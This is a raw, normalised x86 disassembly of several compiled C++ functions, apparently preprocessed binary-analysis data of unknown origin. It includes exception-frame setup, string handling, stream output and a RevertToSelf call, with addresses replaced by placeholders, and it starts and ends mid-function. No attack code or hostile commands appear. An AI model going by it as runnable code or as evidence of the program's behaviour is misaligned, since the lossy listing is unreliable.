mov eax r-xdata
retn
or eax 0x4
sub_4281c0
test esi esi
jne r-xdata
mov edx [ ecx + 0xc ]
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edx
mov edx [ ecx + 0x8 ]
add eax esi
push edx
push eax
mov eax [ ecx ]
call eax
add esp 0xc
mov eax esi
retn
mov edx [ ecx + 0xc ]
push edx
mov edx [ ecx + 0x8 ]
xor eax eax
push edx
push eax
mov eax [ ecx ]
call eax
add esp 0xc
mov eax esi
retn
sub_428200
push ebp
mov ebp esp
push 0xffffffff
push sub_451178
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_436188
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_436188
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_4361b0
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_435e5e
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4361b0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_428480
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp - 0x14 ]
mov [ rw-data ] esi
call sub_436188
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_437d0f
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_43c3a5
lea ecx [ ebp - 0x14 ]
call sub_4361b0
push esi
call sub_435de7
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_428340
push ebp
mov ebp esp
push 0xffffffff
push sub_451178
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_436188
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_436188
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_4361b0
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_435e5e
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4361b0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_428540
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp - 0x14 ]
mov [ rw-data ] esi
call sub_436188
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_437d0f
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_43c3a5
lea ecx [ ebp - 0x14 ]
call sub_4361b0
push esi
call sub_435de7
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_428480
push ebp
mov ebp esp
push 0xffffffff
push sub_45130b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x10
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_4026b0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_402600
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_435bc6
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_428540
push ebp
mov ebp esp
push 0xffffffff
push sub_45114c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x18
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x38 ]
call sub_4026b0
push ecx
lea ecx [ ebp - 0x38 ]
call sub_402600
mov ebx 0x1
mov [ ebp - 0x10 ] ebx
mov [ esi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x2
push esi
mov [ esi ] r--data
call sub_428600
jmp r-xdata
lea ecx [ eax + 0x1c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] esi
mov [ ebp - 0x4 ] 0xffffffff
test bl 0x1
je r-xdata
sub_428600
push ebp
mov ebp esp
push 0xffffffff
push sub_451050
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
call sub_438c6d
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ ebp - 0x4 ] eax
mov edi r--data
call sub_435bc6
mov ebx 0x1
push ebx
call sub_435b34
add esp 0x4
mov ecx eax
mov edi edi
mov [ esi + 0x8 ] eax
call sub_435bc6
mov ebx 0x6
push ebx
mov edi r--data
call sub_435b34
add esp 0x4
mov ecx eax
lea ebx [ ebx ]
mov dl [ edi ]
mov [ ecx ] dl
dec ebx
inc ecx
inc edi
jmp r-xdata
mov [ esi + 0x10 ] eax
call sub_435bc6
mov ebx 0x5
push ebx
mov edi r--data
call sub_435b34
add esp 0x4
mov ecx eax
lea ebx [ ebx ]
mov dl [ edi ]
mov [ ecx ] dl
dec ebx
inc ecx
inc edi
jmp r-xdata
test ebx ebx
je r-xdata
mov [ esi + 0x14 ] eax
call sub_435bc6
mov edi [ ebp - 0x14 ]
mov eax [ edi ]
mov cl [ eax ]
mov [ esi + 0xc ] cl
call sub_435bc6
mov edx [ edi + 0x4 ]
mov al [ edx ]
mov [ esi + 0xd ] al
mov al 0x1
test al al
je r-xdata
mov dl [ edi ]
mov [ ecx ] dl
dec ebx
inc ecx
inc edi
jmp r-xdata
test ebx ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_435bc6
mov [ esi + 0xc ] 0x2e
call sub_435bc6
mov [ esi + 0xd ] 0x2c
test ebx ebx
je r-xdata
sub_428730
push ebp
mov ebp esp
push 0xffffffff
push sub_453cc9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0x48 ] ax
push 0x6
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x50 ] 0x1
mov [ ebp - 0x4c ] sub_428830
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0x2c ] cx
push 0xc
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] esi
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
xor eax eax
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] ax
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
sub_428830
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452e08
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
push r--data
push rw-data
call sub_409de0
add esp 0x8
call [ RevertToSelf@IAT ]
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x10 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x48 ] 0x0
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov [ esp + 0x38 ] 0xffffffff
cmp [ esp + 0x20 ] 0x8
jb r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
jmp r-xdata
xor edx edx
mov [ esp + 0x20 ] 0x7
mov [ esp + 0x1c ] 0x0
mov [ esp + 0xc ] dx
mov ecx [ esp + 0xc ]
push ecx
call sub_43811c
add esp 0x4
push 0xa
mov ecx rw-data
call sub_408340
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_428980
push ebp
mov ebp esp
push 0xffffffff
push sub_453aea
mov eax [ fs : 0x0 ]
push eax
sub esp 0x138
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0x140 ] esi
mov [ ebp - 0x144 ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0x138 ] ax
mov ebx 0x7
push 0x4
mov eax r--data
lea ecx [ ebp - 0x138 ]
mov [ ebp - 0x140 ] 0x1
mov [ ebp - 0x13c ] sub_4291d0
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x128 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0x11c ] cx
push 0x1d
mov eax r--data
lea ecx [ ebp - 0x11c ]
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
call sub_401c90
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
xor edx edx
push 0x5
mov eax r--data
lea ecx [ ebp - 0xfc ]
mov [ ebp - 0x100 ] sub_428d60
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x3
xor eax eax
mov [ ebp - 0xe0 ] ax
push 0x1c
mov eax r--data
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
call sub_401c90
lea eax [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x4
call sub_4173f0
xor ecx ecx
mov [ ebp - 0xc0 ] cx
push 0x4
mov eax r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xc4 ] sub_428ee0
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x5
xor edx edx
push 0x1b
mov eax r--data
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] dx
call sub_401c90
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x6
call sub_4173f0
mov [ ebp - 0x4c ] sub_429060
xor eax eax
mov [ ebp - 0x48 ] ax
push 0x6
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
call sub_401c90
mov [ ebp - 0x4 ] bl
xor ecx ecx
mov [ ebp - 0x2c ] cx
push 0x1d
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x8
call sub_4173f0
xor edx edx
push 0x8
mov eax r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x88 ] sub_429570
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x9
xor eax eax
mov [ ebp - 0x68 ] ax
push 0x8
mov eax r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
call sub_401c90
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0xa
call sub_4173f0
cmp [ ebp - 0x54 ] 0x8
jb r-xdata
xor edx edx
cmp [ ebp - 0x70 ] 0x8
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] dx
jb r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] cx
jb r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] ax
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x90 ] 0x8
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] cx
jb r-xdata
mov eax [ ebp - 0xa4 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0xcc ] 0x8
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xc0 ] ax
jb r-xdata
mov edx [ ebp - 0xc0 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0xe8 ] 0x8
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xe0 ] dx
jb r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x108 ] 0x8
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] cx
jb r-xdata
mov eax [ ebp - 0xfc ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x124 ] 0x8
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x11c ] ax
jb r-xdata
mov edx [ ebp - 0x11c ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x138 ]
push ecx
call sub_43811c
add esp 0x4
sub_428d60
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452e08
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
push r--data
push ecx
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
mov eax [ esi ]
add esp 0x8
call sub_40da00
test al al
je r-xdata
push 0x0
lea eax [ esp + 0x10 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x48 ] 0x0
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov [ esp + 0x38 ] 0xffffffff
cmp [ esp + 0x20 ] 0x8
jb r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
jmp r-xdata
xor edx edx
mov [ esp + 0x20 ] 0x7
mov [ esp + 0x1c ] 0x0
mov [ esp + 0xc ] dx
mov ecx [ esp + 0xc ]
push ecx
call sub_43811c
add esp 0x4
push 0xa
mov ecx rw-data
call sub_408340
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_428ee0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452e08
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
push r--data
push ecx
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
mov eax [ esi ]
lea ecx [ esp + 0x14 ]
push ecx
call sub_40db20
add esp 0xc
test al al
je r-xdata
push 0x0
lea edx [ esp + 0x10 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x48 ] 0x0
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov [ esp + 0x38 ] 0xffffffff
cmp [ esp + 0x20 ] 0x8
jb r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
jmp r-xdata
xor ecx ecx
mov [ esp + 0x20 ] 0x7
mov [ esp + 0x1c ] 0x0
mov [ esp + 0xc ] cx
mov eax [ esp + 0xc ]
push eax
call sub_43811c
add esp 0x4
push 0xa
mov ecx rw-data
call sub_408340
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_429060
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452e08
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
push r--data
push ecx
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
mov eax [ esi ]
add esp 0x8
call sub_40da90
test al al
je r-xdata
push 0x0
lea eax [ esp + 0x10 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x48 ] 0x0
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov [ esp + 0x38 ] 0xffffffff
cmp [ esp + 0x20 ] 0x8
jb r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
jmp r-xdata
xor edx edx
mov [ esp + 0x20 ] 0x7
mov [ esp + 0x1c ] 0x0
mov [ esp + 0xc ] dx
mov ecx [ esp + 0xc ]
push ecx
call sub_43811c
add esp 0x4
push 0xa
mov ecx rw-data
call sub_408340
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_4291d0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452dd8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x30 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x48 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push 0x10
call sub_438178
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esp + 0x10 ] ebx
mov edi ebx
mov edi eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ esp + 0x10 ] edi
jmp r-xdata
push ebx
lea eax [ esp + 0x28 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x60 ] ebx
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ebx [ edi ]
cmp ebx [ edi + 0x4 ]
je r-xdata
mov ecx [ esi ]
mov eax ecx
sub eax [ esi + 0x4 ]
neg eax
sbb eax eax
and eax ecx
push eax
push edi
call sub_40d710
add esp 0x8
test al al
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
xor esi esi
cmp edi esi
je r-xdata
cmp [ ebx + 0x54 ] 0x0
je r-xdata
cmp [ esp + 0x38 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov al 0x1
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x30 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ edi ]
cmp eax esi
je r-xdata
push 0x9
push rw-data
call sub_40e950
add esp 0x8
test [ ebx + 0x38 ] 0x100
je r-xdata
push 0x0
lea eax [ esp + 0x18 ]
push 0x5
push eax
call sub_4374b3
mov edx [ eax + 0xc ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
add ecx rw-data
push edx
push ecx
call eax
mov ecx [ rw-data ]
mov edx [ ecx + 0x4 ]
mov eax 0x20
add esp 0xc
mov [ edx + rw-data ] ax
mov ecx [ ebx + 0x54 ]
push ecx
push rw-data
call sub_408170
mov edx [ esp + 0x24 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
push edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
call sub_43811c
add esp 0x4
mov ecx [ esp + 0x10 ]
mov ebx [ edi + 0x4 ]
push ecx
call sub_40de30
mov edx [ edi ]
add esp 0x4
push edx
call sub_43811c
add esp 0x4
test [ ebx + 0x38 ] 0x2
je r-xdata
push 0x9
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40e950
add esp 0x8
test [ ebx + 0x38 ] 0x1
je r-xdata
push 0x9
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40e950
add esp 0x8
test [ ebx + 0x38 ] 0x10
je r-xdata
push 0x9
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40e950
add esp 0x8
test [ ebx + 0x38 ] 0x20
je r-xdata
push 0x9
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40e950
add esp 0x8
mov eax [ ebx + 0x3c ]
dec eax
cmp eax 0x6
ja r-xdata
push 0x9
push ecx
push r--data
push rw-data
